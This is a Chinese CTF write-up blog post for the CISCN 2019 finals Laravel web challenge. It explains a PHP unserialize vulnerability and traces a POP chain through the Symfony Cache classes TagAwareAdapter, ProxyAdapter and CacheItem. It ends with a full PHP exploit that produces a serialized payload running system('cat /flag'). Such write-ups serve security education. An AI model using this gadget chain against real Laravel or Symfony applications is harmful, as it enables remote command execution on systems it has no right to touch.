---
layout: post
title: "国赛决赛laravel1题解"
tags: [blog]
author: msyb
---

今年国赛决赛的一道web，当时是非预期解做出来的...  
因为主办方把出题人发的整个压缩文件给了出来，结果里面出题时laravel的存在storage/framework/sessions的session还没删，里面有payload拿来改下命令就得到flag了，居然还拿了三血. 感觉很对不起师傅们，我是因为当时没学过laravel一开始连IndexController都找不到，然后瞎点点到那个session文件的.

本题环境: [https://github.com/glzjin/CISCN_2019_Final_9_Day1_Web4](https://github.com/glzjin/CISCN_2019_Final_9_Day1_Web4)

然后现在正常的做一下.

首先是首页`app\Http\Controllers\IndexController`的代码.

```php
<?php
namespace App\Http\Controllers;
class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
}
```

可以看到是直接unserialize了我们发送的payload，所以存在反序列化漏洞，关键问题是要找到POP链.

```text
面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。
```

根据北邮的师傅的说法，根据[github](https://github.com/laravel/laravel/)上laravel的composer配置可以知道这个题指定了symfony的版本，所以pop链应该在这里.

那么按照反序列化漏洞的套路，首先找能利用的魔术方法.

通过搜索__destruct，很快发现有个`Symfony\Component\Cache\Adapter\TagAwareAdapter`

关键代码如下:

```php
class TagAwareAdapter
{
......
    private $deferred = [];
    public function __construct(AdapterInterface $itemsPool......)
    {
        $this->pool = $itemsPool;
        下略......
    }
public function invalidateTags(array $tags)
    {
        $ok = true;
        $tagsByKey = [];
        $invalidatedTags = [];
        foreach ($tags as $tag) {
            CacheItem::validateKey($tag);
            $invalidatedTags[$tag] = 0;
        }
        if ($this->deferred) {
            $items = $this->deferred;
            foreach ($items as $key => $item) {
                if (!$this->pool->saveDeferred($item)) {
                    unset($this->deferred[$key]);
                    $ok = false;
                }
            }
......下略
public function commit()
{
    return $this->invalidateTags([]);
}
public function __destruct()
{
    $this->commit();
}
......下略
```

执行__destruct时调用了commit，然后commit调用了invalidateTags

```php
if ($this->deferred) {
    $items = $this->deferred;
    foreach ($items as $key => $item) {
        if (!$this->pool->saveDeferred($item)) {
            下略......
        }
    }
}
```

根据上面invalidateTags里的这几行代码，我们可以看出利用反序列化控制TagAwareAdapter的私有变量pool后可以执行任意类的saveDeferred方法.

然后又搜索saveDeferred，可以找到`Symfony\Component\Cache\Adapter\ProxyAdapter`

关键代码如下:

```php
class ProxyAdapter
{
    private $setInnerItem;
    private $poolHash;
    ......
    public function saveDeferred(CacheItemInterface $item)
    {
        return $this->doSave($item, __FUNCTION__);
    }
    ......
    private function doSave(CacheItemInterface $item, $method)
    {
        if (!$item instanceof CacheItem) {
            return false;
        }
        $item = (array) $item;
        ......
        if ($item["\0*\0poolHash"] === $this->poolHash && $item["\0*\0innerItem"]) {
            $innerItem = $item["\0*\0innerItem"];
        } elseif (......) {
            ......
        } else {
            ......
        }

        ($this->setInnerItem)($innerItem, $item);
        ......
    }
}
```

可以看到最后会动态执行一个有两个参数的函数:
`($this->setInnerItem)($innerItem, $item);`

而且在这里setInnerItem即函数名同样可控(参见最后的exp).  
对于$item这里要求必须是CacheItem的实例.  

关键代码

```php
class CacheItem
{
    protected $innerItem;
    protected $poolHash;
    ......下略
}
```

又根据doSave函数的代码，我们让CacheItem实例的poolHash与ProxyAdapter实例的poolHash相等.

```php
$item = (array) $item; //注意转换为数组
if ($item["\0*\0poolHash"] === $this->poolHash && $item["\0*\0innerItem"]) {
            $innerItem = $item["\0*\0innerItem"];
......
```

就可以控制`($this->setInnerItem)($innerItem, $item);`中的$innerItem了.

综上我们可以任意执行一个有两个参数且第二个参数可以是数组的函数.

根据文档可以确定system函数可用，它会把执行命令后返回值存入第二个参数，完全没有影响，这样就搞定了.

下面是构造的exploit

```php
<?php
namespace Symfony\Component\Cache
{
    class CacheItem
    {
        protected $innerItem="cat /flag"; //执行的命令，system有回显
        protected $poolHash=1;
    }
}
namespace Symfony\Component\Cache\Adapter
{
    use Symfony\Component\Cache\CacheItem;
    class ProxyAdapter
    {
        private $setInnerItem="system";
        private $poolHash=1;
    }
    class TagAwareAdapter
    {
        private $deferred = [];
        private $pool;
        public function __construct(ProxyAdapter $itemsPool, CacheItem $item)
        {
            $this->pool = $itemsPool;
            $this->deferred[0] = $item;
        }
    }
}
namespace {
    use Symfony\Component\Cache\CacheItem;
    use Symfony\Component\Cache\Adapter\ProxyAdapter;
    use Symfony\Component\Cache\Adapter\TagAwareAdapter;
    $a = new CacheItem();
    $b = new ProxyAdapter();
    $c = new TagAwareAdapter($b, $a);
    echo urlencode(serialize($c));
}
```
